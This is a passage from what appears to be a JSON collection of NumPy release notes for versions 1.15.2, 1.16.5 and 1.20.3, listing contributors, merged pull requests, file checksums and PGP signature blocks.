numpy-1.23.3-cp311-cp311-win_amd64.whl\n    bc6e8da415f359b578b00bcfb1d08411c96e9a97f9e6c7adada554a0812a6cc6  numpy-1.23.3-cp38-cp38-macosx_10_9_x86_64.whl\n    22d43376ee0acd547f3149b9ec12eec2f0ca4a6ab2f61753c5b29bb3e795ac4d  numpy-1.23.3-cp38-cp38-macosx_11_0_arm64.whl\n    a64403f634e5ffdcd85e0b12c08f04b3080d3e840aef118721021f9b48fc1460  numpy-1.23.3-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    efd9d3abe5774404becdb0748178b48a218f1d8c44e0375475732211ea47c67e  numpy-1.23.3-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    f8c02ec3c4c4fcb718fdf89a6c6f709b14949408e8cf2a2be5bfa9c49548fd85  numpy-1.23.3-cp38-cp38-win32.whl\n    e868b0389c5ccfc092031a861d4e158ea164d8b7fdbb10e3b5689b4fc6498df6  numpy-1.23.3-cp38-cp38-win_amd64.whl\n    09f6b7bdffe57fc61d869a22f506049825d707b288039d30f26a0d0d8ea05164  numpy-1.23.3-cp39-cp39-macosx_10_9_x86_64.whl\n    8c79d7cf86d049d0c5089231a5bcd31edb03555bd93d81a16870aa98c6cfb79d  numpy-1.23.3-cp39-cp39-macosx_11_0_arm64.whl\n    e5d5420053bbb3dd64c30e58f9363d7a9c27444c3648e61460c1237f9ec3fa14  numpy-1.23.3-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    d5422d6a1ea9b15577a9432e26608c73a78faf0b9039437b075cf322c92e98e7  numpy-1.23.3-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    c1ba66c48b19cc9c2975c0d354f24058888cdc674bebadceb3cdc9ec403fb5d1  numpy-1.23.3-cp39-cp39-win32.whl\n    78a63d2df1d947bd9d1b11d35564c2f9e4b57898aae4626638056ec1a231c40c  numpy-1.23.3-cp39-cp39-win_amd64.whl\n    17c0e467ade9bda685d5ac7f5fa729d8d3e76b23195471adae2d6a6941bd2c18  numpy-1.23.3-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    91b8d6768a75247026e951dce3b2aac79dc7e78622fc148329135ba189813584  numpy-1.23.3-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    94c15ca4e52671a59219146ff584488907b1f9b3fc232622b47e2cf832e94fb8  numpy-1.23.3-pp38-pypy38_pp73-win_amd64.whl\n    51bf49c0cd1d52be0a240aa66f3458afc4b95d8993d2d04f0d91fa60c10af6cd  numpy-1.23.3.tar.gz\n\n\n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA256\n\n==========================\n", "1.16.5": "==========================\n\nThe NumPy 1.16.5 release fixes bugs reported against the 1.16.4 release, and\nalso backports several enhancements from master that seem appropriate for a\nrelease series that is the last to support Python 2.7. The wheels on PyPI are\nlinked with OpenBLAS v0.3.7-dev, which should fix errors on Skylake series\ncpus.\n\nDownstream developers building this release should use Cython >= 0.29.2 and, if\nusing OpenBLAS, OpenBLAS >= v0.3.7. The supported Python versions are 2.7 and\n3.5-3.7.\n\n\nContributors\n============\n\nA total of 18 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Alexander Shadchin\n* Allan Haldane\n* Bruce Merry +\n* Charles Harris\n* Colin Snyder +\n* Dan Allan +\n* Emile +\n* Eric Wieser\n* Grey Baker +\n* Maksim Shabunin +\n* Marten van Kerkwijk\n* Matti Picus\n* Peter Andreas Entschev +\n* Ralf Gommers\n* Richard Harris +\n* Sebastian Berg\n* Sergei Lebedev +\n* Stephan Hoyer\n\nPull requests merged\n====================\n\nA total of 23 pull requests were merged for this release.\n\n* `13742 <https://github.com/numpy/numpy/pull/13742>`__: ENH: Add project URLs to setup.py\n* `13823 <https://github.com/numpy/numpy/pull/13823>`__: TEST, ENH: fix tests and ctypes code for PyPy\n* `13845 <https://github.com/numpy/numpy/pull/13845>`__: BUG: use npy_intp instead of int for indexing array\n* `13867 <https://github.com/numpy/numpy/pull/13867>`__: TST: Ignore DeprecationWarning during nose imports\n* `13905 <https://github.com/numpy/numpy/pull/13905>`__: BUG: Fix use-after-free in boolean indexing\n* `13933 <https://github.com/numpy/numpy/pull/13933>`__: MAINT/BUG/DOC: Fix errors in _add_newdocs\n* `13984 <https://github.com/numpy/numpy/pull/13984>`__: BUG: fix byte order reversal for datetime64[ns]\n* `13994 <https://github.com/numpy/numpy/pull/13994>`__: MAINT,BUG: Use nbytes to also catch empty descr during allocation\n* `14042 <https://github.com/numpy/numpy/pull/14042>`__: BUG: np.array cleared errors occured in PyMemoryView_FromObject\n* `14043 <https://github.com/numpy/numpy/pull/14043>`__: BUG: Fixes for Undefined Behavior Sanitizer (UBSan) errors.\n* `14044 <https://github.com/numpy/numpy/pull/14044>`__: BUG: ensure that casting to/from structured is properly checked.\n* `14045 <https://github.com/numpy/numpy/pull/14045>`__: MAINT: fix histogram*d dispatchers\n* `14046 <https://github.com/numpy/numpy/pull/14046>`__: BUG: further fixup to histogram2d dispatcher.\n* `14052 <https://github.com/numpy/numpy/pull/14052>`__: BUG: Replace contextlib.suppress for Python 2.7\n* `14056 <https://github.com/numpy/numpy/pull/14056>`__: BUG: fix compilation of 3rd party modules with Py_LIMITED_API...\n* `14057 <https://github.com/numpy/numpy/pull/14057>`__: BUG: Fix memory leak in dtype from dict contructor\n* `14058 <https://github.com/numpy/numpy/pull/14058>`__: DOC: Document array_function at a higher level.\n* `14084 <https://github.com/numpy/numpy/pull/14084>`__: BUG, DOC: add new recfunctions to `__all__`\n* `14162 <https://github.com/numpy/numpy/pull/14162>`__: BUG: Remove stray print that causes a SystemError on python 3.7\n* `14297 <https://github.com/numpy/numpy/pull/14297>`__: TST: Pin pytest version to 5.0.1.\n* `14322 <https://github.com/numpy/numpy/pull/14322>`__: ENH: Enable huge pages in all Linux builds\n* `14346 <https://github.com/numpy/numpy/pull/14346>`__: BUG: fix behavior of structured_to_unstructured on non-trivial...\n* `14382 <https://github.com/numpy/numpy/pull/14382>`__: REL: Prepare for the NumPy 1.16.5 release.\n\nChecksums\n=========\n\nMD5\n- ---\n\n    cf7ff97464eb044cb49618be5fe29aee  numpy-1.16.5-cp27-cp27m-macosx_10_9_x86_64.whl\n    6fbf51644f8722fa90276c04fe3d031f  numpy-1.16.5-cp27-cp27m-manylinux1_i686.whl\n    df4ab8600495131e44ad1b173f6cc9fc  numpy-1.16.5-cp27-cp27m-manylinux1_x86_64.whl\n    2f6fd50a02da9d56e3d950a6b738337e  numpy-1.16.5-cp27-cp27m-win32.whl\n    d36b67522ee102b7865a83b26a1d97aa  numpy-1.16.5-cp27-cp27m-win_amd64.whl\n    5b4f83c092257f6c98bedd44505e7b6d  numpy-1.16.5-cp27-cp27mu-manylinux1_i686.whl\n    d6fd33607099abdea62752cf303a1763  numpy-1.16.5-cp27-cp27mu-manylinux1_x86_64.whl\n    fa48e45bd3e5dbac923296b039e70706  numpy-1.16.5-cp35-cp35m-macosx_10_9_x86_64.whl\n    85a7db0c597037cced7ab82c0f0cdcc8  numpy-1.16.5-cp35-cp35m-manylinux1_i686.whl\n    401e053e98faada4bc8cdcc9b04d619f  numpy-1.16.5-cp35-cp35m-manylinux1_x86_64.whl\n    2912ba9109dca60115dba59606cac27b  numpy-1.16.5-cp35-cp35m-win32.whl\n    756b7ff320ef821f2cd279c5df7c9f46  numpy-1.16.5-cp35-cp35m-win_amd64.whl\n    2ae22b506a07575a4bc6a91d2db25df5  numpy-1.16.5-cp36-cp36m-macosx_10_9_x86_64.whl\n    12cbf61ed2abec3f77cfa3a46b7e4bdc  numpy-1.16.5-cp36-cp36m-manylinux1_i686.whl\n    ab726a4244e9e070cde814d8415cff4c  numpy-1.16.5-cp36-cp36m-manylinux1_x86_64.whl\n    752e461d193b7049e25c7e20f7d4808a  numpy-1.16.5-cp36-cp36m-win32.whl\n    2712434cdfb27a301c49cf97eee656d5  numpy-1.16.5-cp36-cp36m-win_amd64.whl\n    394fee86faa235dea6d2bb6270961266  numpy-1.16.5-cp37-cp37m-macosx_10_9_x86_64.whl\n    0713da36acc884897f76bc8117ca7a42  numpy-1.16.5-cp37-cp37m-manylinux1_i686.whl\n    7856a32b3b2d93d018d2ba5dce941ffa  numpy-1.16.5-cp37-cp37m-manylinux1_x86_64.whl\n    33b7fd0d727c9f09d61879afde8096f6  numpy-1.16.5-cp37-cp37m-win32.whl\n    5287ce297cd8093463bb29bef42db103  numpy-1.16.5-cp37-cp37m-win_amd64.whl\n    f9c22f53f17e81b25af8e53b026a9831  numpy-1.16.5.tar.gz\n    adaad8c166cf0344af3ca1a664dd4a38  numpy-1.16.5.zip\n\nSHA256\n- ------\n\n    37fdd3bb05caaaacac58015cfa38e38b006ee9cef1eaacdb70bb68c16ac7db1d  numpy-1.16.5-cp27-cp27m-macosx_10_9_x86_64.whl\n    f42e21d8db16315bc30b437bff63d6b143befb067b8cd396fa3ef17f1c21e1a0  numpy-1.16.5-cp27-cp27m-manylinux1_i686.whl\n    4208b225ae049641a7a99ab92e84ce9d642ded8250d2b6c9fd61a7fa8c072561  numpy-1.16.5-cp27-cp27m-manylinux1_x86_64.whl\n    4d790e2a37aa3350667d8bb8acc919010c7e46234c3d615738564ddc6d22026f  numpy-1.16.5-cp27-cp27m-win32.whl\n    1594aec94e4896e0688f4f405481fda50fb70547000ae71f2e894299a088a661  numpy-1.16.5-cp27-cp27m-win_amd64.whl\n    2c5a556272c67566e8f4607d1c78ad98e954fa6c32802002a4a0b029ad8dd759  numpy-1.16.5-cp27-cp27mu-manylinux1_i686.whl\n    3a96e59f61c7a8f8838d0f4d19daeba551c5f07c5cdd5c81e8e9d4089ade0042  numpy-1.16.5-cp27-cp27mu-manylinux1_x86_64.whl\n    612297115bade249a118616c065597ff2e5e1f47ed220d7ba71f3e6c6ebcd814  numpy-1.16.5-cp35-cp35m-macosx_10_9_x86_64.whl\n    dbc9e9a6a5e0c4f57498855d4e30ef8b599c0ce13fdf9d64299197508d67d9e8  numpy-1.16.5-cp35-cp35m-manylinux1_i686.whl\n    fada0492dd35412cd96e0578677e9a4bdae8f102ef2b631301fcf19066b57119  numpy-1.16.5-cp35-cp35m-manylinux1_x86_64.whl\n    ada1a1cd68b9874fa480bd287438f92bd7ce88ca0dd6e8d56c70f2b3dab97314  numpy-1.16.5-cp35-cp35m-win32.whl\n    27aa457590268cb059c47daa8c55f48c610ce81da8a062ec117f74efa9124ec9  numpy-1.16.5-cp35-cp35m-win_amd64.whl\n    03b28330253904d410c3c82d66329f29645eb54a7345cb7dd7a1529d61fa603f  numpy-1.16.5-cp36-cp36m-macosx_10_9_x86_64.whl\n    911d91ffc6688db0454d69318584415f7dfb0fc1b8ac9b549234e39495684230  numpy-1.16.5-cp36-cp36m-manylinux1_i686.whl\n    ceb353e3ae840ce76256935b18c17236ca808509f231f41d5173d7b2680d5e77  numpy-1.16.5-cp36-cp36m-manylinux1_x86_64.whl\n    e6ce7c0051ed5443f8343da2a14580aa438822ae6526900332c4564f371d2aaf  numpy-1.16.5-cp36-cp36m-win32.whl\n    9a2b950bca9faca0145491ae9fd214c432f2b1e36783399bc2c3732e7bcc94f4  numpy-1.16.5-cp36-cp36m-win_amd64.whl\n    00836128feaf9a7c7fedeea05ad593e7965f523d23fe3ffbf20cfffd88e9f2b1  numpy-1.16.5-cp37-cp37m-macosx_10_9_x86_64.whl\n    3d6a354bb1a1ce2cabd47e0bdcf25364322fb55a29efb59f76944d7ee546d8b6  numpy-1.16.5-cp37-cp37m-manylinux1_i686.whl\n    f7fb27c0562206787011cf299c03f663c604b58a35a9c2b5218ba6485a17b145  numpy-1.16.5-cp37-cp37m-manylinux1_x86_64.whl\n    46469e7fcb689036e72ce61c3d432ed35eb4c71b5119e894845b434b0fae5813  numpy-1.16.5-cp37-cp37m-win32.whl\n    fb207362394567343d84c0462ec3ba203a21c78be9a0fdbb94982e76859ec37e  numpy-1.16.5-cp37-cp37m-win_amd64.whl\n    2b63c414fb43a4f0cb69b29b7e9d48275af0dbb5b1ffd2f2de99c4df9967e151  numpy-1.16.5.tar.gz\n    8bb452d94e964b312205b0de1238dd7209da452343653ab214b5d681780e7a0c  numpy-1.16.5.zip\n-----BEGIN PGP SIGNATURE-----\n\niQEzBAEBCAAdFiEEU6DlKD8F4p1xKRSeZ58ig3fFJHsFAl1l0dAACgkQZ58ig3fF\nJHvM6Af/TfF32rF/fZNy4gFbpFinXB4IgiVdiAQ3qchS9sN47wRlHxz9bd+3hftI\nZoVRlLhp3ZYrDpwBCkF3m8wWasyn9D4PhWvSyTEw2lKViP1iN3LyrG2dW4x06SIO\nbUHKd77YCTG4kjaa8ngpDaZTy7t/sfvNoXYuQNph4QA3SeAycGesb/xAda/yqsGE\nIxYmrvzcrBIv8k8JcJYv6XevZnQgIfSi0o/+4WFNd291LdESM1rPTm4eP4n8ig04\nQKYVWt2gFVmYmSLlNCemS0dd7Xo9wkXk1U3uRKfBzIZqF6nXgAXzewgfjBIHYH+0\n+qgZsIQjvqKGNJp32NgvliptGqiwEA==\n=bjhU\n-----END PGP SIGNATURE-----\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.20.3": "==========================\n\nNumPy 1.20.3 is a bugfix release containing several fixes merged to the main\nbranch after the NumPy 1.20.2 release.\n\nContributors\n============\n\nA total of 7 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Anne Archibald\n* Bas van Beek\n* Charles Harris\n* Dong Keun Oh +\n* Kamil Choudhury +\n* Sayed Adel\n* Sebastian Berg\n\nPull requests merged\n====================\n\nA total of 15 pull requests were merged for this release.\n\n* `18763 <https://github.com/numpy/numpy/pull/18763>`__: BUG: Correct ``datetime64`` missing type overload for ``datetime.date``...\n* `18764 <https://github.com/numpy/numpy/pull/18764>`__: MAINT: Remove ``__all__`` in favor of explicit re-exports\n* `18768 <https://github.com/numpy/numpy/pull/18768>`__: BLD: Strip extra newline when dumping gfortran version on MacOS\n* `18769 <https://github.com/numpy/numpy/pull/18769>`__: BUG: fix segfault in object/longdouble operations\n* `18794 <https://github.com/numpy/numpy/pull/18794>`__: MAINT: Use towncrier build explicitly\n* `18887 <https://github.com/numpy/numpy/pull/18887>`__: MAINT: Relax certain integer-type constraints\n* `18915 <https://github.com/numpy/numpy/pull/18915>`__: MAINT: Remove unsafe unions and ABCs from return-annotations\n* `18921 <https://github.com/numpy/numpy/pull/18921>`__: MAINT: Allow more recursion depth for scalar tests.\n* `18922 <https://github.com/numpy/numpy/pull/18922>`__: BUG: Initialize the full nditer buffer in case of error\n* `18923 <https://github.com/numpy/numpy/pull/18923>`__: BLD: remove unnecessary flag ``-faltivec`` on macOS\n* `18924 <https://github.com/numpy/numpy/pull/18924>`__: MAINT, CI: treats _SIMD module build warnings as errors through...\n* `18925 <https://github.com/numpy/numpy/pull/18925>`__: BUG: for MINGW, threads.h existence test requires GLIBC > 2.12\n* `18941 <https://github.com/numpy/numpy/pull/18941>`__: BUG: Make changelog recognize gh- as a PR number prefix.\n* `18948 <https://github.com/numpy/numpy/pull/18948>`__: REL, DOC: Prepare for the NumPy 1.20.3 release.\n* `18953 <https://github.com/numpy/numpy/pull/18953>`__: BUG: Fix failing mypy test in 1.20.x.\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    702d0185042f1ff9a5d7e72a29f4e1c0  numpy-1.20.3-cp37-cp37m-macosx_10_9_x86_64.whl\n    3d0284b39b20c243b74f6690ad5ae27f  numpy-1.20.3-cp37-cp37m-manylinux_2_12_i686.manylinux2010_i686.whl\n    d1b42dd67dc228088cf822eaab86d424  numpy-1.20.3-cp37-cp37m-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    126b1a5d46cc7d9b9b426f56d075a1e0  numpy-1.20.3-cp37-cp37m-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    5b0445346f08b610025dbd2064d4b482  numpy-1.20.3-cp37-cp37m-manylinux_2_5_i686.manylinux1_i686.whl\n    02bd4a2c764882e8af353c16344cb633  numpy-1.20.3-cp37-cp37m-manylinux_2_5_x86_64.manylinux1_x86_64.whl\n    0f6a36724d5477c8fca6c34e73683db6  numpy-1.20.3-cp37-cp37m-win32.whl\n    c7d3ae93743d6c0ea2c9dfcad1d42cb4  numpy-1.20.3-cp37-cp37m-win_amd64.whl\n    445da50ae14b3318170ccf996baca72c  numpy-1.20.3-cp38-cp38-macosx_10_9_x86_64.whl\n    c651fdb4829703e164bc78613c1a90a8  numpy-1.20.3-cp38-cp38-manylinux_2_12_i686.manylinux2010_i686.whl\n    c9411ef729b8ebe9ed3b8e9dee3da4ac  numpy-1.20.3-cp38-cp38-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    ff69ad241598607fdfea24155625a6e3  numpy-1.20.3-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    9fd8d44d8a5f19e434e9dfb7738d954f  numpy-1.20.3-cp38-cp38-manylinux_2_5_i686.manylinux1_i686.whl\n    d144fdfe141442a7f362d498bc9a40c2  numpy-1.20.3-cp38-cp38-manylinux_2_5_x86_64.manylinux1_x86_64.whl\n    e7ffa27f1c75cf11529d90967fa15bbc  numpy-1.20.3-cp38-cp38-win32.whl\n    58c12a54d1b5bc14d36ed2b0d8617fef  numpy-1.20.3-cp38-cp38-win_amd64.whl\n    18efbadcb513054c765f826fc3bb1645  numpy-1.20.3-cp39-cp39-macosx_10_9_x86_64.whl\n    319300952bd42455cb2ad98188c74b5f  numpy-1.20.3-cp39-cp39-manylinux_2_12_i686.manylinux2010_i686.whl\n    1d1451f9a5a2eeef666fc512a101a6ca  numpy-1.20.3-cp39-cp39-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    cdef3fb002bb5e3036f056ea0528c804  numpy-1.20.3-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    85e575735877094f3a76106e9d2a9cac  numpy-1.20.3-cp39-cp39-win32.whl\n    59f1dba95dedc7a1bebc58ee7e7a945a  numpy-1.20.3-cp39-cp39-win_amd64.whl\n    6abc979843929b41b099e4e6c0253063  numpy-1.20.3-pp37-pypy37_pp73-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    802ddf90c7e226ba56ed0ea244f8b53d  numpy-1.20.3.tar.gz\n    949d9114af9accc25ede1daa359c4227  numpy-1.20.3.zip\n\nSHA256\n------\n::\n\n    70eb5808127284c4e5c9e836208e09d685a7978b6a216db85960b1a112eeace8  numpy-1.20.3-cp37-cp37m-macosx_10_9_x86_64.whl\n    6ca2b85a5997dabc38301a22ee43c82adcb53ff660b89ee88dded6b33687e1d8  numpy-1.20.3-cp37-cp37m-manylinux_2_12_i686.manylinux2010_i686.whl\n    c5bf0e132acf7557fc9bb8ded8b53bbbbea8892f3c9a1738205878ca9434206a  numpy-1.20.3-cp37-cp37m-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    db250fd3e90117e0312b611574cd1b3f78bec046783195075cbd7ba9c3d73f16  numpy-1.20.3-cp37-cp37m-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    637d827248f447e63585ca3f4a7d2dfaa882e094df6cfa177cc9cf9cd6cdf6d2  numpy-1.20.3-cp37-cp37m-manylinux_2_5_i686.manylinux1_i686.whl\n    8b7bb4b9280da3b2856cb1fc425932f46fba609819ee1c62256f61799e6a51d2  numpy-1.20.3-cp37-cp37m-manylinux_2_5_x86_64.manylinux1_x86_64.whl\n    67d44acb72c31a97a3d5d33d103ab06d8ac20770e1c5ad81bdb3f0c086a56cf6  numpy-1.20.3-cp37-cp37m-win32.whl\n    43909c8bb289c382170e0282158a38cf306a8ad2ff6dfadc447e90f9961bef43  numpy-1.20.3-cp37-cp37m-win_amd64.whl\n    f1452578d0516283c87608a5a5548b0cdde15b99650efdfd85182102ef7a7c17  numpy-1.20.3-cp38-cp38-macosx_10_9_x86_64.whl\n    6e51534e78d14b4a009a062641f465cfaba4fdcb046c3ac0b1f61dd97c861b1b  numpy-1.20.3-cp38-cp38-manylinux_2_12_i686.manylinux2010_i686.whl\n    e515c9a93aebe27166ec9593411c58494fa98e5fcc219e47260d9ab8a1cc7f9f  numpy-1.20.3-cp38-cp38-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    c1c09247ccea742525bdb5f4b5ceeacb34f95731647fe55774aa36557dbb5fa4  numpy-1.20.3-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    66fbc6fed94a13b9801fb70b96ff30605ab0a123e775a5e7a26938b717c5d71a  numpy-1.20.3-cp38-cp38-manylinux_2_5_i686.manylinux1_i686.whl\n    ea9cff01e75a956dbee133fa8e5b68f2f92175233de2f88de3a682dd94deda65  numpy-1.20.3-cp38-cp38-manylinux_2_5_x86_64.manylinux1_x86_64.whl\n    f39a995e47cb8649673cfa0579fbdd1cdd33ea497d1728a6cb194d6252268e48  numpy-1.20.3-cp38-cp38-win32.whl\n    1676b0a292dd3c99e49305a16d7a9f42a4ab60ec522eac0d3dd20cdf362ac010  numpy-1.20.3-cp38-cp38-win_amd64.whl\n    830b044f4e64a76ba71448fce6e604c0fc47a0e54d8f6467be23749ac2cbd2fb  numpy-1.20.3-cp39-cp39-macosx_10_9_x86_64.whl\n    55b745fca0a5ab738647d0e4db099bd0a23279c32b31a783ad2ccea729e632df  numpy-1.20.3-cp39-cp39-manylinux_2_12_i686.manylinux2010_i686.whl\n    5d050e1e4bc9ddb8656d7b4f414557720ddcca23a5b88dd7cff65e847864c400  numpy-1.20.3-cp39-cp39-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    a9c65473ebc342715cb2d7926ff1e202c26376c0dcaaee85a1fd4b8d8c1d3b2f  numpy-1.20.3-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    16f221035e8bd19b9dc9a57159e38d2dd060b48e93e1d843c49cb370b0f415fd  numpy-1.20.3-cp39-cp39-win32.whl\n    6690080810f77485667bfbff4f69d717c3be25e5b11bb2073e76bb3f578d99b4  numpy-1.20.3-cp39-cp39-win_amd64.whl\n    4e465afc3b96dbc80cf4a5273e5e2b1e3451286361b4af70ce1adb2984d392f9  numpy-1.20.3-pp37-pypy37_pp73-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    b7340f0628ce1823c151e3d2a2a8cba2a3ff1357fba4475a24b1816e75c21f90  numpy-1.20.3.tar.gz\n    e55185e51b18d788e49fe8305fd73ef4470596b33fc2c1ceb304566b99c71a69  numpy-1.20.3.zip\n\n\n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA1\n\n==========================\n", "1.15.2": "==========================\n\nThis is a bugfix release for bugs and regressions reported following the 1.15.1\nrelease.\n\n* The matrix PendingDeprecationWarning is now suppressed in pytest 3.8.\n* The new cached allocations machinery has been fixed to be thread safe.\n* The boolean indexing of subclasses now works correctly.\n* A small memory leak in PyArray_AdaptFlexibleDType has been fixed.\n\nThe Python versions supported by this release are 2.7, 3.4-3.7. The wheels are\nlinked with OpenBLAS v0.3.0, which should fix some of the linalg problems\nreported for NumPy 1.14.\n\nCompatibility Note\n==================\n\nThe NumPy 1.15.x OS X wheels released on PyPI no longer contain 32-bit\nbinaries.  That will also be the case in future releases. See\n`11625 <https://github.com/numpy/numpy/issues/11625>`__ for the related\ndiscussion.  Those needing 32-bit support should look elsewhere or build\nfrom source.\n\nContributors\n============\n\nA total of 4 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Charles Harris\n* Julian Taylor\n* Marten van Kerkwijk\n* Matti Picus\n\nPull requests merged\n====================\n\nA total of 4 pull requests were merged for this release.\n\n* `11902 <https://github.com/numpy/numpy/pull/11902>`__: BUG: Fix matrix PendingDeprecationWarning suppression for pytest...\n* `11981 <https://github.com/numpy/numpy/pull/11981>`__: BUG: fix cached allocations without the GIL for 1.15.x\n* `11982 <https://github.com/numpy/numpy/pull/11982>`__: BUG: fix refcount leak in PyArray_AdaptFlexibleDType\n* `11992 <https://github.com/numpy/numpy/pull/11992>`__: BUG: Ensure boolean indexing of subclasses sets base correctly.\n\nChecksums\n=========\n\nMD5\n- ---\n\n    6935d733421b32533eebc7d9a5b1bde9  numpy-1.15.2-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    d80b588176313013d50a513d1b3d8cb8  numpy-1.15.2-cp27-cp27m-manylinux1_i686.whl\n    34b93ec0335f8dd028137bd3c1434800  numpy-1.15.2-cp27-cp27m-manylinux1_x86_64.whl\n    008df3819bf77abdb0546d96f660bec0  numpy-1.15.2-cp27-cp27mu-manylinux1_i686.whl\n    48530fca78a9abdfa34c2b19c2d45600  numpy-1.15.2-cp27-cp27mu-manylinux1_x86_64.whl\n    3b6032a8100df348ab0c17545dd7b72d  numpy-1.15.2-cp27-none-win32.whl\n    2e1c8985c10e813a7b8de54f18f99921  numpy-1.15.2-cp27-none-win_amd64.whl\n    2e9bab1f2bb399945cd660062c1d63ac  numpy-1.15.2-cp34-cp34m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    d774936507ac59e0ed8cd6b9592449fe  numpy-1.15.2-cp34-cp34m-manylinux1_i686.whl\n    5f0b7cb501e3e459f043725330dd19f8  numpy-1.15.2-cp34-cp34m-manylinux1_x86_64.whl\n    5c54aa9f3825af973ed7c4c38bf499bc  numpy-1.15.2-cp34-none-win32.whl\n    1f479fa8f54da6726aa9729d296d31e7  numpy-1.15.2-cp34-none-win_amd64.whl\n    e7100118df61980e784ac71a9eafe410  numpy-1.15.2-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    f55e7f845d9f18a6c3cf8a0dc4515226  numpy-1.15.2-cp35-cp35m-manylinux1_i686.whl\n    de9a79dd7abcaa099b34234d7ee43903  numpy-1.15.2-cp35-cp35m-manylinux1_x86_64.whl\n    48e7213f7029a38e6a63e1e92c50c15d  numpy-1.15.2-cp35-none-win32.whl\n    3086e690e4eef8b10523349e93c34dcb  numpy-1.15.2-cp35-none-win_amd64.whl\n    9e56f996c325345a5a3076a9f5d0abfe  numpy-1.15.2-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    e7835fb3d56d4bbcd8d47120df709cbf  numpy-1.15.2-cp36-cp36m-manylinux1_i686.whl\n    5151de4cfdec3623d4061d0e7a8677bb  numpy-1.15.2-cp36-cp36m-manylinux1_x86_64.whl\n    7f911b24989f8d6aa0e6617fea6e8c10  numpy-1.15.2-cp36-none-win32.whl\n    948dbd9c23ac7948485d5a07a48a27eb  numpy-1.15.2-cp36-none-win_amd64.whl\n    921214854ed05d5e0c294b2fcc345d37  numpy-1.15.2-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    38a69cfe0d954d05054a73e5f56b1533  numpy-1.15.2-cp37-cp37m-manylinux1_i686.whl\n    4ce844e4452baf8c25025e53e59d91ff  numpy-1.15.2-cp37-cp37m-manylinux1_x86_64.whl\n    2de0167b4297d1732e25c9288bbe3add  numpy-1.15.2-cp37-none-win32.whl\n    de26b3d5573b0c9a6cd38eeb4e8d865e  numpy-1.15.2-cp37-none-win_amd64.whl\n    d40b15478148a48ec324327578de4583  numpy-1.15.2.tar.gz\n    5a55a994eca6095b1e82d44600217ece  numpy-1.15.2.zip\n\nSHA256\n- ------\n\n    b5ff7dae352fd9e1edddad1348698e9fea14064460a7e39121ef9526745802e6  numpy-1.15.2-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    1b1cf8f7300cf7b11ddb4250b3898c711a6187df05341b5b7153db23ffe5d498  numpy-1.15.2-cp27-cp27m-manylinux1_i686.whl\n    ec8bf53ef7c92c99340972519adbe122e82c81d5b87cbd955c74ba8a8cd2a4ad  numpy-1.15.2-cp27-cp27m-manylinux1_x86_64.whl\n    733dc5d47e71236263837825b69c975bc08728ae638452b34aeb1d6fa347b780  numpy-1.15.2-cp27-cp27mu-manylinux1_i686.whl\n    82f00a1e2695a0e5b89879aa25ea614530b8ebdca6d49d4834843d498e8a5e92  numpy-1.15.2-cp27-cp27mu-manylinux1_x86_64.whl\n    63f833a7c622e9082df3cbaf03b4fd92d7e0c11e2f9d87cb57dbf0e84441964b  numpy-1.15.2-cp27-none-win32.whl\n    c898f9cca806102fcacb6309899743aa39efb2ad2a302f4c319f54db9f05cd84  numpy-1.15.2-cp27-none-win_amd64.whl\n    f2e55726a9ee2e8129d6ce6abb466304868051bcc7a09d652b3b07cd86e801a2  numpy-1.15.2-cp34-cp34m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    981224224bbf44d95278eb37996162e8beb6f144d2719b144e86dfe2fce6c510  numpy-1.15.2-cp34-cp34m-manylinux1_i686.whl\n    f592fd7fe1f20b5041928cce1330937eca62f9058cb41e69c2c2d83cffc0d1e3  numpy-1.15.2-cp34-cp34m-manylinux1_x86_64.whl\n    9ad36dbfdbb0cba90a08e7343fadf86f43cf6d87450e8d2b5d71d7c7202907e4  numpy-1.15.2-cp34-none-win32.whl\n    d1569013e8cc8f37e9769d19effdd85e404c976cd0ca28a94e3ddc026c216ae8  numpy-1.15.2-cp34-none-win_amd64.whl\n    